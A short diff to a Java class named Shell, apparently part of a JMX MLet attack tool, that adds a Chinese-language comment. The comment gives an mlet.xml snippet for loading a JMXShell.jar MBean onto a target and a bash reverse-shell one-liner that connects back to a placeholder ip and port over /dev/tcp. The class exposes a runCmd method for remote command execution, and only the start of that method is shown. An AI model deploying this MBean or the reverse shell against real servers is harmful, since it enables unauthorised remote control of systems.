@@ -12,6 +12,10 @@ import java.lang.management.ManagementFactory;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
 
+/**
+ * mlet.xml文件内容: <MLET CODE=me.muphy.mbean ARCHIVE=JMXShell.jar NAME=:NAME=Shell></MLET>
+ * 反弹shell: /bin/bash -i >& /dev/tcp/ip/port 0>&1
+ */
 public class Shell implements ShellMBean {
     @Override
     public String runCmd(String cmd) throws IOException, InterruptedException {
